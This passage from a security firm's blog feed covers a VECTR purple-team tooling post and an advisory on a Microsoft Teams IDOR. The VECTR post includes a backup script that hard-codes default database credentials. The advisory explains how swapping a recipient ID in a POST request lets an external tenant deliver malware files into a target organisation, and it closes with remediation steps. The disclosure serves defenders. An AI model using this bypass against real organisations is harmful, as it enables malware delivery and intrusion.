&lt;p&gt;As we at JUMPSEC gain more experience with cloud red teaming we have come to appreciate the major, and minor, shifts in perspective that are necessary when targeting cloud environments. Gone are the days of being highly exploit-centric red teamers, when the success in cloud environments can, in large part, come down to the understanding and abuse of cloud configurations and functionality. Whilst ‘popping shells’ will never lose its novelty, it is often less impactful than going after key identities within the cloud environment. However, what really excites us is the knowledge that there remains so much to explore and evolve in cloud red teaming. It is for this reason that we are dedicating so much time and energy to stay ahead in this burgeoning area of offensive security.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>VECTR for Purple Team Engagements</title>
      <link>//localhost:1313/articles/2023/09/2023-09-29-vectr-for-purple-team-engagements/</link>
      <pubDate>Fri, 29 Sep 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/09/2023-09-29-vectr-for-purple-team-engagements/</guid>
      <description>
        
        
        &lt;h2&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As anyone who has conducted a lengthy purple team engagement will tell you, logging and centralising the huge amount of data from these engagements can quickly become overwhelming. In the past we have seen attempts to use generic productivity software, such as Sharepoint, to attempt to track the huge number of activities and logs generated by both the red and blue teams. However, as you can imagine, shoehorning large quantities of engagement data from two teams with different operating procedures into a single application not built for this purpose can be…tricky.&lt;/p&gt;
&lt;p&gt;As purple team enthusiasts, we believe we have found a better solution to this problem, and sharing that with the wider security community is the purpose of this blog post. We also want to share some guidance when using this framework to help others avoid making the mistakes we have in the past.&lt;/p&gt;
&lt;h2&gt;What is VECTR?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;what-is-vectr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#what-is-vectr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;First of all, what is VECTR? VECTR is an open-source purple team framework that can assist in all phases of purple team exercises, from planning and executing test cases to sharing the relevant information with clients and colleagues. At its core, VECTR is a tool that enables red and blue teams to work together towards a common goal. The framework helps with streamlining operations, enhancing collaboration, and provides advanced reporting capabilities which we have found to be very useful. It allows purple teams to achieve a more comprehensive and proactive approach to improving security by highlighting the gaps that will help build, or improve, defensive controls.&lt;/p&gt;
&lt;p&gt;However, keep in mind that VECTR is still just a tool in your arsenal and it will not automate the above-mentioned tasks for you (at least not yet!). It therefore still requires a certain amount of manual labour for planning and entering test cases, maintaining and setting up the hosting server and importing libraries or backing up your databases. However, as a framework it does a good job of organising what can often become an enormous and convoluted data set of a lengthy purple team into something manageable and built for purpose.&lt;/p&gt;
&lt;h2&gt;Setup and Backup&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setup-and-backup&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setup-and-backup&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The framework was developed by SRA (SecurityRiskAdvisors), it’s open-source and is available here: &lt;a href=&#34;https://www.google.com/url?q=https://github.com/SecurityRiskAdvisors/VECTR&amp;amp;sa=D&amp;amp;source=editors&amp;amp;ust=1695990756685968&amp;amp;usg=AOvVaw0izs_1WzGwrSSxOt8_V-8j&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/SecurityRiskAdvisors/VECTR&lt;/a&gt;. The setup is relatively straightforward and can be achieved by following the installation documentation located at &lt;a href=&#34;https://www.google.com/url?q=https://docs.vectr.io/Installation/&amp;amp;sa=D&amp;amp;source=editors&amp;amp;ust=1695990756686426&amp;amp;usg=AOvVaw16aNSRVjOiaTb-Vhgj5OYr&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://docs.vectr.io/Installation/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.gif&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Starting up the VECTR instance.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;starting-up-the-vectr-instance&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#starting-up-the-vectr-instance&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;VECTR stores engagement data in a MongoDB database. When delivering purple team engagements this database can be exported and has, in our case, been included as a deliverable to be used by our clients to explore the details of the engagement in their own time.&lt;/p&gt;
&lt;p&gt;As VECTR will soon become the home of all of your important engagement data, it is crucial to have regular backups! To eliminate human error we create a cron job which executes a script that backs up the VECTR’s mongo database. We have shared this below.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
#  1. the script logs into the vectr box via ssh 
#   and executes mongodump on the mongo container -
#        to save a snapshot of VECTR&amp;#39;s database in /tmp.
#  2. the dump is then moved out of the docker container 
#   and on the hosting box&amp;#39;s /tmp folder, archived as .tgz.
# 3. using scp, a copy of the database dump is move onto your 
#   local machine in ~/PurpleTeam/VECTR_Backups
#
now=$(date &amp;#34;&amp;#43;%b_%d_%Y_%H.%M&amp;#34;)
echo backup day and month:&amp;#34;$now&amp;#34;

# run mongodump in the container, put it in the /tmp/ directory in the container. 
# This is using the default password and default container name:
ssh -i ~/.ssh/vectr_box_rsa root@10.10.0.10 &amp;#34;docker exec -w /tmp purpleteam-vectr-mongo-1 /bin/bash -c &amp;#39;mongodump --username mongouser --password mongopsw --authenticationDatabase admin&amp;#34;

# copy the file out of the container:
ssh -i ~/.ssh/vectr_box_rsa root@10.10.0.10 &amp;#34;docker cp purpleteam-vectr-mongo-1:/tmp/dump$now.tgz .&amp;#34;

# copy the file to local machine:
scp -i ~/.ssh/vectr_box_rsa root@10.10.0.10:&amp;#34;/root/dump$now.tgz&amp;#34; ~/PurpleTeam/VECTR_BACKUPS/&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h6&gt;&lt;em&gt;The above script can be used and executed regularly using a cronjob.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-above-script-can-be-used-and-executed-regularly-using-a-cronjob&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-above-script-can-be-used-and-executed-regularly-using-a-cronjob&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/crontabvectr.png&#34; title=&#34;crontabvectr&#34; alt=&#34;crontabvectr&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;crontabvectr&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;img src=&#34;images/image6.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;The picture shows the crontab that execute the backup script every 30 minutes.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-picture-shows-the-crontab-that-execute-the-backup-script-every-30-minutes&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-picture-shows-the-crontab-that-execute-the-backup-script-every-30-minutes&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;In the worst case scenario, the mongo database can be restored to another VECTR instance running on a different box:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Copy the database backup onto the new machine and then copy it to the VECTR’s 
# mongo container using the following command:
docker cp /home/ubuntu/dump.tgz instance_name-vectr-mongo-1:/home/
# Extract the database inside the docker container:
tar -xzvf dump.tgz
# Enter the container using bash:
docker exec -it instance_name-vectr-mongo-1 bash
# It is now possible to restore the database using the following command on the 
# VECTR hosting container:
mongorestore ./databasename -db --username mongodbuser --password mongodbpassword --authenticationDatabase admin&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h6&gt;&lt;em&gt;Procedure to restore a mongodb database on VECTR.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;procedure-to-restore-a-mongodb-database-on-vectr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#procedure-to-restore-a-mongodb-database-on-vectr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;Key Features&lt;span class=&#34;absolute -mt-20&#34; id=&#34;key-features&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#key-features&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Here are some of the features that we believe make VECTR an attractive option for purple teamers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Easy deployment&lt;/li&gt;
&lt;li&gt;Atomic Red Team integration&lt;/li&gt;
&lt;li&gt;Automation of test cases execution via custom runtimes&lt;/li&gt;
&lt;li&gt;Maintenance and backup integrations&lt;/li&gt;
&lt;li&gt;Reporting features (charts and graphs)&lt;/li&gt;
&lt;li&gt;MITRE Navigator integration&lt;/li&gt;
&lt;li&gt;Detection rules libraries&lt;/li&gt;
&lt;li&gt;Customisation options&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One of the things we love about VECTR is how clearly it was built for purple team engagements. As you can see below, each test case is split into red team and blue team. This allows for the red team to carry out a test case and log the outcome, evidence and change the status of the test case ready for the blue team. Built into the same test case item you have a section for the blue team to update if it was detected, prevented or alerted, and provide their own evidence. There really is no other tool we have found that makes centralising engagement activity so straightforward.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;How the Red and Blue team collaboration experience looks like in VECTR.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-the-red-and-blue-team-collaboration-experience-looks-like-in-vectr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-the-red-and-blue-team-collaboration-experience-looks-like-in-vectr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;&lt;img src=&#34;images/image5.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;Atomic Red Team&lt;span class=&#34;absolute -mt-20&#34; id=&#34;atomic-red-team&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#atomic-red-team&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;As many purple teamers know, Atomic Red Team (ART) is a collection of Tactics, Techniques and Procedures (TTPs) that can speed up the process of identifying gaps in detection and response controls. It does this by automating the execution of techniques that are commonly carried out by advanced threat groups, allowing you to cover far more ground than manual testing alone. VECTR provides a nifty out-of-the-box integration for this library that can then be used to build specific “campaigns” (as labelled by VECTR). VECTR will generate an executable file in which all of your selected TTPs can be conducted one after another, hugely speeding up the process of mimicking the TTPs of a wide range of threat actors. We found that this freed up more time for the manual activities, whilst still allowing us to get wide coverage.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image2.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Importing the ART library on VECTR to be used in our campaigns.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;importing-the-art-library-on-vectr-to-be-used-in-our-campaigns&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#importing-the-art-library-on-vectr-to-be-used-in-our-campaigns&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;The techniques can be individually “deployed” and executed on a target system (Windows, MacOS or Linux) or performed sequentially by leveraging the “Automation Runtime” executable generated from the VECTR dashboard.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image3.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Selecting techniques to include in the Automation Runtime executable.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;selecting-techniques-to-include-in-the-automation-runtime-executable&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#selecting-techniques-to-include-in-the-automation-runtime-executable&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;&lt;img src=&#34;images/image7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Individual techniques compiled through VECTR’s Automation Runtime feature.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;individual-techniques-compiled-through-vectrs-automation-runtime-feature&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#individual-techniques-compiled-through-vectrs-automation-runtime-feature&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;Reporting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reporting&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reporting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Finally, we mentioned that we leverage the charts and graphics implemented in VECTR. The data and information logged in your test cases can be easily converted into visual representations of the security estate. We have found this to be especially useful when presenting to executive or non-technical audiences.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;A pie chart generated off the test cases carried out and their result.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;a-pie-chart-generated-off-the-test-cases-carried-out-and-their-result&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#a-pie-chart-generated-off-the-test-cases-carried-out-and-their-result&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In summary, we found VECTR to be an exceptional tool for purple team engagements and collaborative projects that require both red and blue teams working together. The framework provides a great number of features out of the box, as well as opportunities for customisation. For this reason, we continue to use it during our purple team engagements and would like to extend a thank you to the team over at SRA for maintaining it.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory: IDOR in Microsoft Teams Allows for External Tenants to Introduce Malware</title>
      <link>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</link>
      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</guid>
      <description>
        
        
        &lt;h3&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Max Corbridge (@CorbridgeMax) and Tom Ellson (@tde_sec) of JUMPSEC’s Red Team recently discovered a vulnerability in the latest version of Microsoft Teams which allows for the possible introduction of malware into any organisations using Microsoft Teams in its default configuration. This is done by bypassing client-side security controls which prevent external tenants from sending files (malware in this case) to staff in your organisation. JUMPSEC has detailed remediation options, as well as some detection opportunities. &lt;/p&gt;
&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Introducing malware into target organisations is becoming increasingly difficult. Many of the traditional payload types (.exe, Office Macros, etc) are now heavily-scrutinised or have been proactively addressed to reduce their &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;efficacy&lt;/em&gt;&lt;/a&gt;. Similarly, payload delivery avenues such as phishing are becoming increasingly monitored and secured to reduce the ease with which threat actors’ malware can reach end-user devices. Mail security controls, IP blocklists, domain reputation, email HTML, content inspection, third-party mail security products, URL filtering and many more must be bypassed for a phishing campaign to traverse all anti-phishing security controls and land in a target’s inbox. &lt;/p&gt;
&lt;p&gt;As such, threat actors and red teams alike are looking for newer and potentially overlooked avenues of payload delivery. One such novel avenue is Microsoft Teams External Tenants. Organisations that use Microsoft Teams (91% of the Fortune 100 according to &lt;a href=&#34;https://www.linkedin.com/pulse/91-fortune-100-companies-use-teams-techbanditshack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;this article&lt;/em&gt;&lt;/a&gt;) inherit Microsoft’s default configuration which allows users from outside of their organisation to reach out to their staff members. By allowing this, an entirely new avenue of social engineering (and now payload delivery as this blog will explain) is created.&lt;/p&gt;
&lt;h3&gt;Detail&lt;span class=&#34;absolute -mt-20&#34; id=&#34;detail&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#detail&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft Teams allows any user with a Microsoft account to reach out to ‘external tenancies’. Here, external tenancies can be thought of as any business or organisation using Microsoft Teams. These organisations each have their own Microsoft tenancy, and users from one tenancy are able to send messages to users in another tenancy. When doing so, an ‘External’ banner appears alongside the name as seen below. &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19671&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;391&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/external.png&#34; title=&#34;External banner on incoming message&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;External banner on incoming message&lt;/figcaption&gt;
  &lt;/figure&gt; External banner applied to incoming message requests[/caption]&lt;/p&gt;
&lt;p&gt;As someone who spent a long time doing purely social engineering (phishing, vishing, smshing, etc.) this is not a show stopper by any means. In my experience, whilst this banner (and the subsequent pop-up) may deter a handful of targets, there is still a significant percentage of staff that would click on a message from an external tenant and accept the subsequent warning that the user is ‘external’. In fact, this was proven only last month, as the techniques used in this blog post were successfully used to gain an initial foothold in a client’s environment as part of a red team engagement. This is especially true if the malicious party is impersonating a known member of your organisation, and has purchased and registered a brand-impersonation domain as red teams often do.&lt;/p&gt;
&lt;p&gt;When messaging staff in another organisation you are blocked from sending files to them, unlike with members of your own tenancy. See below the difference:&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19672&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1496&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Messaging a member of the same organisation&#34; alt=&#34;Messaging a member of the same organisation &#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Messaging a member of the same organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Messaging a member of the same organisation[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19673&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1421&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;Restrictions when messaging someone in a different organisation&#34; alt=&#34;Restrictions when messaging someone in a different organisation&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Restrictions when messaging someone in a different organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Restrictions when messaging someone in a different organisation[/caption]&lt;/p&gt;
&lt;p&gt;So far, this is nothing new. However, having leveraged this social engineering avenue in the past I began wondering if this security control could be bypassed to allow for seamless delivery of payloads directly into a target&amp;rsquo;s inbox on our red team engagements. I began looking online, and articles &lt;a href=&#34;https://aadinternals.com/post/teams-policies/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;like this&lt;/em&gt;&lt;/a&gt; suggested that certain security controls are actually implemented client-side in Microsoft Teams.&lt;/p&gt;
&lt;p&gt;I raised this with JUMPSEC’s Head of Offensive Security (Tom Ellson) and no more than 10 minutes later we had bypassed the security control and were able to send files into a target organisation. Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request, usually here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;/v1/users/ME/conversations/&amp;lt;RECIPIENT_ID&amp;gt;/messages &lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19674&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1429&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt; Payload delivered directly into a target inbox[/caption]&lt;/p&gt;
&lt;p&gt;When sending the payload like this, it is actually hosted on a Sharepoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link. &lt;/p&gt;
&lt;p&gt;Having identified the issue, I wanted to validate that this vulnerability would work as intended as an avenue for payload delivery into a target organisation, and not fall short for some unknown reason when used in a mature client environment. As such, last month I used this vulnerability to deliver our red team C2 (malware) payload directly into a target inbox to gain our initial foothold on a covert red team engagement. This allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys. &lt;/p&gt;
&lt;h3&gt;Why is this a big deal?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-is-this-a-big-deal&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-is-this-a-big-deal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The true reason I see this to be a potentially lucrative avenue for threat actors to deliver payloads is the fact that this bypasses nearly all modern anti-phishing security controls mentioned in the introduction of this advisory. &lt;/p&gt;
&lt;p&gt;Firstly, it is very straightforward to buy a domain similar to your target organisations and register it with M365. It avoids the need to use mature domains, with web servers, landing pages, CAPTCHAs, domain categorisation, and URL filtering. This is a huge time saver, as this can cost several days or more on a red team engagement when setting up the various bits of infrastructure needed for a convincing phishing campaign. &lt;/p&gt;
&lt;p&gt;Secondly, it avoids the now-rightfully-dangerous act of clicking on a link in an email, something that staff have been trained to avoid for years now, greatly reducing the likelihood of a typical staff member detecting this as a phishing attack. The payload will now be served by a trusted Sharepoint domain, and will arrive in the form of a file in a target’s Teams inbox. As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website.&lt;/p&gt;
&lt;p&gt;Finally, when this vulnerability is combined with social engineering via Teams it becomes very easy to start a back-and-forth conversation, jump on a call, share screens, and more. By comparison, it makes social engineering via email feel very stagnant, and stop-start. When using this on a real engagement the pretext of an IT technician was used to ask the target if they could jump on a call to update some critical software. Once on the call this vulnerability was leveraged to deliver a payload and, when combined with a full social engineering attack, was implicitly trusted by the target. &lt;/p&gt;
&lt;h3&gt;Impact&lt;span class=&#34;absolute -mt-20&#34; id=&#34;impact&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#impact&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability affects every organisation using Teams in the default configuration. As such it has huge potential reach, and could be leveraged by threat actors to bypass many traditional payload delivery security controls. Having now proven this hypothesis, and used this vulnerability to successfully deliver malware that compromised a target machine in a client&amp;rsquo;s environment, I feel this has been successfully demonstrated as an exploitable finding.&lt;/p&gt;
&lt;h3&gt;Remediation and Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;remediation-and-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#remediation-and-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability was reported to Microsoft, who validated that the vulnerability is legitimate, but said that it ‘did not meet the bar for immediate servicing’. I think this is a shame, but was nonetheless expected. As such, JUMPSEC has added this section to help organisations who might be concerned about the above findings. &lt;/p&gt;
&lt;p&gt;Firstly, I urge you to review if there is a business requirement for external tenants to have permission to message your staff in the first place. Of course, many businesses do legitimately require communication with other organisations, service providers, and more. That is not the case, however, for all businesses that use Teams. If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether. This can be done in Microsoft Teams Admin Center &amp;gt; External Access.&lt;/p&gt;
&lt;p&gt;If you do require communication with external tenants, but there are only a handful of organisations that you regularly communicate with, then you can change the security settings to only allow communication with certain allow-listed domains. This would be a good middle ground for shutting down this attack path, without affecting your business operations. This can be done in Microsoft Teams Admin Center &amp;gt; External Access. &lt;/p&gt;
